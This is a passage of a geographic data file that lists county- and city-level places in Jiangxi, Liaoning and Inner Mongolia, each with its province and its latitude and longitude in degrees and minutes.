["\u6C5F\u897F\u7701", "\u9756\u5B89\u53BF", "28", "52", "115", "21"], ["\u6C5F\u897F\u7701", "\u5B89\u4E49\u53BF", "28", "51", "115", "33"], ["\u6C5F\u897F\u7701", "\u6B66\u5B81\u53BF", "29", "16", "115", "6"], ["\u6C5F\u897F\u7701", "\u661F\u5B50\u53BF", "29", "27", "116", "2"], ["\u6C5F\u897F\u7701", "\u4E5D\u6C5F\u53BF", "29", "37", "115", "53"], ["\u6C5F\u897F\u7701", "\u6E56\u53E3\u53BF", "29", "44", "116", "13"], ["\u6C5F\u897F\u7701", "\u90FD\u660C\u53BF", "29", "16", "116", "11"], ["\u6C5F\u897F\u7701", "\u5FB7\u5B89\u53BF", "29", "20", "115", "46"], ["\u6C5F\u897F\u7701", "\u6C38\u4FEE\u53BF", "29", "2", "115", "48"], ["\u6C5F\u897F\u7701", "\u8FDB\u8D24\u53BF", "28", "22", "116", "16"], ["\u6C5F\u897F\u7701", "\u5357\u660C\u53BF", "28", "33", "115", "56"], ["\u6C5F\u897F\u7701", "\u65B0\u5EFA\u53BF", "28", "42", "115", "49"], ["\u6C5F\u897F\u7701", "\u5949\u65B0\u53BF", "28", "42", "115", "23"], ["\u6C5F\u897F\u7701", "\u65B0\u5E72\u53BF", "27", "46", "115", "24"], ["\u6C5F\u897F\u7701", "\u5CE1\u6C5F\u53BF", "27", "37", "115", "20"], ["\u6C5F\u897F\u7701", "\u6C38\u4E30\u53BF", "27", "19", "115", "26"], ["\u6C5F\u897F\u7701", "\u4E50\u5B89\u53BF", "27", "26", "115", "50"], ["\u6C5F\u897F\u7701", "\u5D07\u4EC1\u53BF", "27", "46", "116", "3"], ["\u6C5F\u897F\u7701", "\u5B9C\u9EC4\u53BF", "27", "33", "116", "13"], ["\u6C5F\u897F\u7701", "\u5357\u57CE\u53BF", "27", "33", "116", "38"], ["\u6C5F\u897F\u7701", "\u91D1\u6EAA\u53BF", "27", "55", "116", "46"], ["\u6C5F\u897F\u7701", "\u8D44\u6EAA\u53BF", "27", "42", "117", "4"], ["\u6C5F\u897F\u7701", "\u6A2A\u5CF0\u53BF", "28", "25", "117", "36"], ["\u6C5F\u897F\u7701", "\u94C5\u5C71\u53BF", "28", "19", "117", "42"], ["\u6C5F\u897F\u7701", "\u5F0B\u9633\u53BF", "28", "24", "117", "26"], ["\u6C5F\u897F\u7701", "\u4E07\u5E74\u53BF", "28", "42", "117", "4"], ["\u6C5F\u897F\u7701", "\u4F59\u6C5F\u53BF", "28", "12", "116", "49"], ["\u6C5F\u897F\u7701", "\u4E1C\u4E61\u53BF", "28", "14", "116", "37"], ["\u6C5F\u897F\u7701", "\u4F59\u5E72\u53BF", "28", "42", "116", "41"], ["\u6C5F\u897F\u7701", "\u9131\u9633\u53BF", "28", "60", "116", "40"], ["\u6C5F\u897F\u7701", "\u5F6D\u6CFD\u53BF", "29", "54", "116", "33"], ["\u6C5F\u897F\u7701", "\u6D6E\u6881\u53BF", "29", "22", "117", "15"], ["\u6C5F\u897F\u7701", "\u5A7A\u6E90\u53BF", "29", "15", "117", "51"], ["\u6C5F\u897F\u7701", "\u5E7F\u4E30\u53BF", "28", "26", "118", "11"], ["\u6C5F\u897F\u7701", "\u5357\u4E30\u53BF", "27", "13", "116", "32"], ["\u6C5F\u897F\u7701", "\u9ECE\u5DDD\u53BF", "27", "18", "116", "55"], ["\u6C5F\u897F\u7701", "\u7389\u5C71\u53BF", "28", "41", "118", "15"], ["\u6C5F\u897F\u7701", "\u4E0A\u9976\u53BF", "28", "26", "117", "55"], ["\u8FBD\u5B81\u7701", "\u6C88\u9633\u5E02", "41", "48", "123", "26"], ["\u8FBD\u5B81\u7701", "\u846B\u82A6\u5C9B\u5E02", "40", "43", "120", "50"], ["\u8FBD\u5B81\u7701", "\u9526\u5DDE\u5E02", "41", "6", "121", "8"], ["\u8FBD\u5B81\u7701", "\u5927\u8FDE\u5E02", "38", "55", "121", "37"], ["\u8FBD\u5B81\u7701", "\u4E39\u4E1C\u5E02", "40", "8", "124", "23"], ["\u8FBD\u5B81\u7701", "\u672C\u6EAA\u5E02", "41", "18", "123", "46"], ["\u8FBD\u5B81\u7701", "\u8FBD\u9633\u5E02", "41", "16", "123", "10"], ["\u8FBD\u5B81\u7701", "\u978D\u5C71\u5E02", "41", "6", "122", "59"], ["\u8FBD\u5B81\u7701", "\u8425\u53E3\u5E02", "40", "40", "122", "14"], ["\u8FBD\u5B81\u7701", "\u76D8\u9526\u5E02", "41", "7", "122", "4"], ["\u8FBD\u5B81\u7701", "\u629A\u987A\u5E02", "41", "53", "123", "59"], ["\u8FBD\u5B81\u7701", "\u94C1\u5CAD\u5E02", "42", "17", "123", "50"], ["\u8FBD\u5B81\u7701", "\u961C\u65B0\u5E02", "42", "1", "121", "40"], ["\u8FBD\u5B81\u7701", "\u671D\u9633\u5E02", "41", "34", "120", "27"], ["\u8FBD\u5B81\u7701", "\u53CC\u53F0\u5B50\u533A", "41", "12", "122", "3"], ["\u8FBD\u5B81\u7701", "\u5174\u9686\u53F0\u533A", "41", "7", "122", "4"], ["\u8FBD\u5B81\u7701", "\u5F13\u957F\u5CAD\u533A", "41", "8", "123", "27"], ["\u8FBD\u5B81\u7701", "\u5B8F\u4F1F\u533A", "41", "12", "123", "12"], ["\u8FBD\u5B81\u7701", "\u5343\u5C71\u533A", "41", "4", "122", "58"], ["\u8FBD\u5B81\u7701", "\u94C1\u4E1C\u533A", "41", "6", "122", "59"], ["\u8FBD\u5B81\u7701", "\u94C1\u897F\u533A", "41", "7", "122", "57"], ["\u8FBD\u5B81\u7701", "\u7ACB\u5C71\u533A", "41", "9", "122", "60"], ["\u8FBD\u5B81\u7701", "\u8001\u8FB9\u533A", "40", "40", "122", "22"], ["\u8FBD\u5B81\u7701", "\u897F\u5E02\u533A", "40", "40", "122", "13"], ["\u8FBD\u5B81\u7701", "\u7AD9\u524D\u533A", "40", "41", "122", "16"], ["\u8FBD\u5B81\u7701", "\u9C85\u9C7C\u5708\u533A", "40", "16", "122", "7"], ["\u8FBD\u5B81\u7701", "\u65C5\u987A\u53E3\u533A", "38", "49", "121", "16"], ["\u8FBD\u5B81\u7701", "\u94F6\u5DDE\u533A", "42", "17", "123", "51"], ["\u8FBD\u5B81\u7701", "\u4E8E\u6D2A\u533A", "41", "47", "123", "18"], ["\u8FBD\u5B81\u7701", "\u4E1C\u9675\u533A", "41", "46", "123", "28"], ["\u8FBD\u5B81\u7701", "\u94C1\u897F\u533A", "41", "48", "123", "21"], ["\u8FBD\u5B81\u7701", "\u91D1\u5DDE\u533A", "39", "6", "121", "42"], ["\u8FBD\u5B81\u7701", "\u548C\u5E73\u533A", "41", "47", "123", "24"], ["\u8FBD\u5B81\u7701", "\u897F\u5C97\u533A", "38", "55", "121", "36"], ["\u8FBD\u5B81\u7701", "\u6C88\u6CB3\u533A", "41", "48", "123", "27"], ["\u8FBD\u5B81\u7701", "\u6E05\u6CB3\u533A", "42", "32", "124", "9"], ["\u8FBD\u5B81\u7701", "\u4E2D\u5C71\u533A", "38", "55", "121", "38"], ["\u8FBD\u5B81\u7701", "\u7518\u4E95\u5B50\u533A", "38", "57", "121", "34"], ["\u8FBD\u5B81\u7701", "\u6C99\u6CB3\u53E3\u533A", "38", "54", "121", "35"], ["\u8FBD\u5B81\u7701", "\u7687\u59D1\u533A", "41", "49", "123", "25"], ["\u8FBD\u5B81\u7701", "\u5927\u4E1C\u533A", "41", "48", "123", "28"], ["\u8FBD\u5B81\u7701", "\u82CF\u5BB6\u5C6F\u533A", "41", "40", "123", "20"], ["\u8FBD\u5B81\u7701", "\u65B0\u57CE\u5B50\u533A", "42", "3", "123", "31"], ["\u8FBD\u5B81\u7701", "\u6D77\u5DDE\u533A", "42", "1", "121", "39"], ["\u8FBD\u5B81\u7701", "\u592A\u5E73\u533A", "42", "1", "121", "40"], ["\u8FBD\u5B81\u7701", "\u7EC6\u6CB3\u533A", "42", "2", "121", "41"], ["\u8FBD\u5B81\u7701", "\u6E05\u6CB3\u95E8\u533A", "41", "45", "121", "25"], ["\u8FBD\u5B81\u7701", "\u53CC\u5854\u533A", "41", "34", "120", "27"], ["\u8FBD\u5B81\u7701", "\u9F99\u57CE\u533A", "41", "36", "120", "26"], ["\u8FBD\u5B81\u7701", "\u671D\u9633\u53BF", "41", "35", "120", "28"], ["\u8FBD\u5B81\u7701", "\u51CC\u6CB3\u533A", "41", "7", "121", "9"], ["\u8FBD\u5B81\u7701", "\u53E4\u5854\u533A", "41", "8", "121", "7"], ["\u8FBD\u5B81\u7701", "\u592A\u548C\u533A", "41", "6", "121", "6"], ["\u8FBD\u5B81\u7701", "\u5357\u7968\u533A", "41", "6", "120", "45"], ["\u8FBD\u5B81\u7701", "\u8FDE\u5C71\u533A", "40", "46", "120", "52"], ["\u8FBD\u5B81\u7701", "\u9F99\u6E2F\u533A", "40", "43", "120", "56"], ["\u8FBD\u5B81\u7701", "\u51CC\u6E90\u5E02", "41", "15", "119", "24"], ["\u8FBD\u5B81\u7701", "\u5174\u57CE\u5E02", "40", "37", "120", "43"], ["\u8FBD\u5B81\u7701", "\u51CC\u6D77\u5E02", "41", "10", "121", "21"], ["\u8FBD\u5B81\u7701", "\u666E\u5170\u5E97\u5E02", "39", "24", "121", "57"], ["\u8FBD\u5B81\u7701", "\u74E6\u623F\u5E97\u5E02", "39", "37", "121", "60"], ["\u8FBD\u5B81\u7701", "\u5E84\u6CB3\u5E02", "39", "42", "122", "59"], ["\u8FBD\u5B81\u7701", "\u4E1C\u6E2F\u5E02", "39", "52", "124", "9"], ["\u8FBD\u5B81\u7701", "\u51E4\u57CE\u5E02", "40", "27", "124", "4"], ["\u8FBD\u5B81\u7701", "\u706F\u5854\u5E02", "41", "25", "123", "20"], ["\u8FBD\u5B81\u7701", "\u6D77\u57CE\u5E02", "40", "53", "122", "42"], ["\u8FBD\u5B81\u7701", "\u76D6\u5DDE\u5E02", "40", "24", "122", "21"], ["\u8FBD\u5B81\u7701", "\u5927\u77F3\u6865\u5E02", "40", "39", "122", "30"], ["\u8FBD\u5B81\u7701", "\u5317\u9547\u5E02", "41", "36", "121", "48"], ["\u8FBD\u5B81\u7701", "\u65B0\u6C11\u5E02", "41", "60", "122", "49"], ["\u8FBD\u5B81\u7701", "\u5F00\u539F\u5E02", "42", "33", "124", "2"], ["\u8FBD\u5B81\u7701", "\u8C03\u5175\u5C71\u5E02", "42", "28", "123", "33"], ["\u8FBD\u5B81\u7701", "\u5317\u7968\u5E02", "41", "48", "120", "46"], ["\u8FBD\u5B81\u7701", "\u592A\u5B50\u6CB3\u533A", "41", "15", "123", "11"], ["\u8FBD\u5B81\u7701", "\u6587\u5723\u533A", "41", "16", "123", "11"], ["\u8FBD\u5B81\u7701", "\u767D\u5854\u533A", "41", "16", "123", "10"], ["\u8FBD\u5B81\u7701", "\u632F\u5174\u533A", "40", "5", "124", "21"], ["\u8FBD\u5B81\u7701", "\u632F\u5B89\u533A", "40", "10", "124", "25"], ["\u8FBD\u5B81\u7701", "\u5143\u5B9D\u533A", "40", "8", "124", "23"], ["\u8FBD\u5B81\u7701", "\u5357\u82AC\u533A", "41", "6", "123", "44"], ["\u8FBD\u5B81\u7701", "\u6EAA\u6E56\u533A", "41", "20", "123", "46"], ["\u8FBD\u5B81\u7701", "\u660E\u5C71\u533A", "41", "18", "123", "49"], ["\u8FBD\u5B81\u7701", "\u5E73\u5C71\u533A", "41", "18", "123", "46"], ["\u8FBD\u5B81\u7701", "\u671B\u82B1\u533A", "41", "51", "123", "47"], ["\u8FBD\u5B81\u7701", "\u4E1C\u6D32\u533A", "41", "51", "124", "1"], ["\u8FBD\u5B81\u7701", "\u65B0\u629A\u533A", "41", "52", "123", "53"], ["\u8FBD\u5B81\u7701", "\u987A\u57CE\u533A", "41", "53", "123", "56"], ["\u8FBD\u5B81\u7701", "\u5580\u5587\u6C81\u5DE6\u7FFC\u8499\u53E4\u65CF\u81EA\u6CBB\u53BF", "41", "8", "119", "44"], ["\u8FBD\u5B81\u7701", "\u5EFA\u660C\u53BF", "40", "49", "119", "48"], ["\u8FBD\u5B81\u7701", "\u5EFA\u5E73\u53BF", "41", "24", "119", "38"], ["\u8FBD\u5B81\u7701", "\u7EE5\u4E2D\u53BF", "40", "19", "120", "20"], ["\u8FBD\u5B81\u7701", "\u957F\u6D77\u53BF", "39", "16", "122", "35"], ["\u8FBD\u5B81\u7701", "\u5CAB\u5CA9\u6EE1\u65CF\u81EA\u6CBB\u53BF", "40", "17", "123", "17"], ["\u8FBD\u5B81\u7701", "\u672C\u6EAA\u6EE1\u65CF\u81EA\u6CBB\u53BF", "41", "18", "124", "7"], ["\u8FBD\u5B81\u7701", "\u8FBD\u9633\u53BF", "41", "13", "123", "4"], ["\u8FBD\u5B81\u7701", "\u53F0\u5B89\u53BF", "41", "23", "122", "25"], ["\u8FBD\u5B81\u7701", "\u5927\u6D3C\u53BF", "40", "59", "122", "4"], ["\u8FBD\u5B81\u7701", "\u76D8\u5C71\u53BF", "41", "15", "122", "1"], ["\u8FBD\u5B81\u7701", "\u9ED1\u5C71\u53BF", "41", "42", "122", "7"], ["\u8FBD\u5B81\u7701", "\u961C\u65B0\u8499\u53E4\u65CF\u81EA\u6CBB\u53BF", "42", "4", "121", "45"], ["\u8FBD\u5B81\u7701", "\u5F70\u6B66\u53BF", "42", "23", "122", "32"], ["\u8FBD\u5B81\u7701", "\u8FBD\u4E2D\u53BF", "41", "31", "122", "43"], ["\u8FBD\u5B81\u7701", "\u629A\u987A\u53BF", "41", "53", "123", "54"], ["\u8FBD\u5B81\u7701", "\u660C\u56FE\u53BF", "42", "47", "124", "6"], ["\u8FBD\u5B81\u7701", "\u94C1\u5CAD\u53BF", "42", "18", "123", "50"], ["\u8FBD\u5B81\u7701", "\u6CD5\u5E93\u53BF", "42", "30", "123", "24"], ["\u8FBD\u5B81\u7701", "\u5EB7\u5E73\u53BF", "42", "45", "123", "21"], ["\u8FBD\u5B81\u7701", "\u4E49\u53BF", "41", "32", "121", "14"], ["\u8FBD\u5B81\u7701", "\u897F\u4E30\u53BF", "42", "44", "124", "43"], ["\u8FBD\u5B81\u7701", "\u6E05\u539F\u6EE1\u65CF\u81EA\u6CBB\u53BF", "42", "6", "124", "55"], ["\u8FBD\u5B81\u7701", "\u65B0\u5BBE\u6EE1\u65CF\u81EA\u6CBB\u53BF", "41", "44", "125", "2"], ["\u8FBD\u5B81\u7701", "\u6853\u4EC1\u6EE1\u65CF\u81EA\u6CBB\u53BF", "41", "16", "125", "21"], ["\u8FBD\u5B81\u7701", "\u5BBD\u7538\u6EE1\u65CF\u81EA\u6CBB\u53BF", "40", "44", "124", "47"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u547C\u548C\u6D69\u7279\u5E02", "40", "50", "111", "44"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5DF4\u5F66\u6DD6\u5C14\u5E02", "40", "45", "107", "25"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u963F\u62C9\u5584\u76DF", "38", "50", "105", "40"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E4C\u6D77\u5E02", "39", "40", "106", "49"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u9102\u5C14\u591A\u65AF\u5E02", "39", "37", "109", "48"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5305\u5934\u5E02", "40", "39", "109", "50"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E4C\u5170\u5BDF\u5E03\u5E02", "40", "59", "113", "7"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u8D64\u5CF0\u5E02", "42", "16", "118", "55"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u9521\u6797\u90ED\u52D2\u76DF", "43", "57", "116", "4"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u547C\u4F26\u8D1D\u5C14\u5E02", "49", "13", "119", "46"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5174\u5B89\u76DF", "46", "5", "122", "3"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u901A\u8FBD\u5E02", "43", "37", "122", "16"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6D77\u62C9\u5C14\u533A", "49", "13", "119", "46"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u677E\u5CAD\u533A", "50", "48", "124", "17"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u52A0\u683C\u8FBE\u5947\u533A", "50", "25", "124", "7"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u83AB\u529B\u8FBE\u74E6\u8FBE\u65A1\u5C14\u65CF\u81EA\u6CBB\u65D7", "48", "28", "124", "30"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u79D1\u5C14\u6C81\u533A", "43", "37", "122", "16"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5143\u5B9D\u5C71\u533A", "42", "2", "119", "17"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u677E\u5C71\u533A", "42", "17", "118", "55"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u7EA2\u5C71\u533A", "42", "17", "118", "58"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u96C6\u5B81\u533A", "41", "2", "113", "6"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u7389\u6CC9\u533A", "40", "45", "111", "40"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u56DE\u6C11\u533A", "40", "48", "111", "36"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u8D5B\u7F55\u533A", "40", "48", "111", "41"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u65B0\u57CE\u533A", "40", "52", "111", "39"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u767D\u4E91\u9102\u535A\u77FF\u533A", "41", "46", "109", "58"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u77F3\u62D0\u533A", "40", "41", "110", "16"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E1C\u6CB3\u533A", "40", "35", "110", "1"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E5D\u539F\u533A", "40", "36", "109", "58"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u9752\u5C71\u533A", "40", "39", "109", "54"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6606\u90FD\u4ED1\u533A", "40", "38", "109", "50"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E34\u6CB3\u533A", "40", "45", "107", "24"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E1C\u80DC\u533A", "39", "49", "110", "0"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6D77\u5357\u533A", "39", "26", "106", "53"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E4C\u8FBE\u533A", "39", "30", "106", "42"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6D77\u52C3\u6E7E\u533A", "39", "42", "106", "50"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E30\u9547\u5E02", "40", "26", "113", "9"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u9521\u6797\u6D69\u7279\u5E02", "43", "56", "116", "4"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u970D\u6797\u90ED\u52D2\u5E02", "45", "32", "119", "39"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E8C\u8FDE\u6D69\u7279\u5E02", "43", "39", "111", "59"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6EE1\u6D32\u91CC\u5E02", "49", "35", "117", "27"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6839\u6CB3\u5E02", "50", "47", "121", "31"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u989D\u5C14\u53E4\u7EB3\u5E02", "50", "14", "120", "11"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u7259\u514B\u77F3\u5E02", "49", "17", "120", "44"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u624E\u5170\u5C6F\u5E02", "47", "59", "122", "45"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u963F\u5C14\u5C71\u5E02", "47", "11", "119", "56"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E4C\u5170\u6D69\u7279\u5E02", "46", "5", "122", "3"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u963F\u62C9\u5584\u53F3\u65D7", "39", "12", "101", "41"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u989D\u6D4E\u7EB3\u65D7", "41", "58", "101", "4"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E4C\u62C9\u7279\u540E\u65D7", "41", "6", "107", "4"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E94\u539F\u53BF", "41", "6", "108", "16"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u676D\u9526\u540E\u65D7", "40", "53", "107", "9"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u78F4\u53E3\u53BF", "40", "20", "107", "1"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u963F\u62C9\u5584\u5DE6\u65D7", "38", "50", "105", "40"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u9102\u6258\u514B\u524D\u65D7", "38", "11", "107", "29"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u9102\u6258\u514B\u65D7", "39", "6", "107", "59"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E4C\u5BA1\u65D7", "38", "36", "108", "51"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u51C6\u683C\u5C14\u65D7", "39", "52", "111", "14"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4F0A\u91D1\u970D\u6D1B\u65D7", "39", "34", "109", "44"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u676D\u9526\u65D7", "39", "50", "108", "43"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E4C\u62C9\u7279\u524D\u65D7", "40", "43", "108", "39"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E4C\u62C9\u7279\u4E2D\u65D7", "41", "34", "108", "31"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u8FBE\u5C14\u7F55\u8302\u660E\u5B89\u8054\u5408\u65D7", "41", "42", "110", "26"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u56FA\u9633\u53BF", "41", "2", "110", "3"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u8FBE\u62C9\u7279\u65D7", "40", "24", "110", "2"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u571F\u9ED8\u7279\u53F3\u65D7", "40", "34", "110", "31"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u571F\u9ED8\u7279\u5DE6\u65D7", "40", "43", "111", "8"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6258\u514B\u6258\u53BF", "40", "16", "111", "11"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u548C\u6797\u683C\u5C14\u53BF", "40", "23", "111", "49"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u51C9\u57CE\u53BF", "40", "32", "112", "29"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5353\u8D44\u53BF", "40", "54", "112", "34"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5BDF\u54C8\u5C14\u53F3\u7FFC\u4E2D\u65D7", "41", "16", "112", "38"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u56DB\u5B50\u738B\u65D7", "41", "31", "111", "42"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6B66\u5DDD\u53BF", "41", "5", "111", "27"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u82CF\u5C3C\u7279\u53F3\u65D7", "42", "45", "112", "39"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u9576\u9EC4\u65D7", "42", "14", "113", "50"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5316\u5FB7\u53BF", "41", "54", "113", "60"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5546\u90FD\u53BF", "41", "33", "113", "32"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5BDF\u54C8\u5C14\u53F3\u7FFC\u540E\u65D7", "41", "27", "113", "11"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5BDF\u54C8\u5C14\u53F3\u7FFC\u524D\u65D7", "40", "47", "113", "13"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5174\u548C\u53BF", "40", "53", "113", "53"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6E05\u6C34\u6CB3\u53BF", "39", "55", "111", "41"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5B81\u57CE\u53BF", "41", "36", "119", "20"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5580\u5587\u6C81\u65D7", "41", "56", "118", "42"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u7FC1\u725B\u7279\u65D7", "42", "56", "119", "1"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u591A\u4F26\u53BF", "42", "11", "116", "28"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6B63\u84DD\u65D7", "42", "15", "115", "60"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u592A\u4EC6\u5BFA\u65D7", "41", "54", "115", "17"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6B63\u9576\u767D\u65D7", "42", "18", "114", "60"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u963F\u5DF4\u560E\u65D7", "44", "1", "114", "58"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u514B\u4EC0\u514B\u817E\u65D7", "43", "15", "117", "32"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5DF4\u6797\u5DE6\u65D7", "43", "59", "119", "23"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u6797\u897F\u53BF", "43", "36", "118", "3"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5DF4\u6797\u53F3\u65D7", "43", "31", "118", "40"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u897F\u4E4C\u73E0\u7A46\u6C81\u65D7", "44", "35", "117", "36"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u4E1C\u4E4C\u73E0\u7A46\u6C81\u65D7", "45", "31", "116", "58"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u65B0\u5DF4\u5C14\u864E\u5DE6\u65D7", "48", "13", "118", "16"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u65B0\u5DF4\u5C14\u864E\u53F3\u65D7", "48", "40", "116", "49"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u82CF\u5C3C\u7279\u5DE6\u65D7", "43", "51", "113", "38"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u9648\u5DF4\u5C14\u864E\u65D7", "49", "19", "119", "26"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u9102\u6E29\u514B\u65CF\u81EA\u6CBB\u65D7", "49", "8", "119", "45"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u9102\u4F26\u6625\u81EA\u6CBB\u65D7", "50", "35", "123", "43"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u624E\u8D49\u7279\u65D7", "46", "44", "122", "54"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u963F\u8363\u65D7", "48", "8", "123", "28"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u79D1\u5C14\u6C81\u53F3\u7FFC\u524D\u65D7", "46", "4", "121", "55"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u79D1\u5C14\u6C81\u53F3\u7FFC\u4E2D\u65D7", "45", "3", "121", "28"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u7A81\u6CC9\u53BF", "45", "23", "121", "34"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u624E\u9C81\u7279\u65D7", "44", "33", "120", "55"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u963F\u9C81\u79D1\u5C14\u6C81\u65D7", "43", "53", "120", "5"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5F00\u9C81\u53BF", "43", "36", "121", "18"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u79D1\u5C14\u6C81\u5DE6\u7FFC\u540E\u65D7", "42", "57", "122", "21"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u5948\u66FC\u65D7", "42", "51", "120", "39"], ["\u5185\u8499\u53E4\u81EA\u6CBB\u533A", "\u79D1\u5C14\u6C81\u5DE6\u7FFC\u4E2D\u65D7", "44", "8", "123", "19"], 